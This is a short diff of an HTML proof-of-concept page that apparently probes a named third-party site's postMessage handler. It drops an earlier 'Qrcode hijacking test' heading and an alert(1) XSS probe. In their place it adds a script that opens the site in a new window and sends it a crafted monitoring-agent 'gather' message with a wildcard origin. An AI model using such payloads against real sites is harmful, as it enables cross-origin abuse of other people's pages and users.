@@ -1,2 +1,7 @@
-<h1>Qrcode hijacking test!!!</h1>
-<script>alert(1);</script>
+<script>
+childwin = window.open("http://jflove.10010.com/projects?projectName=%E7%A7%AF%E5%88%86");
+function sendMessage(){
+	childwin.postMessage('_TINGYUN{"type":"gather","fromJS":"APM"}', '*')
+}
+(function(){setTimeout("sendMessage()", 1000);}());
+</script>
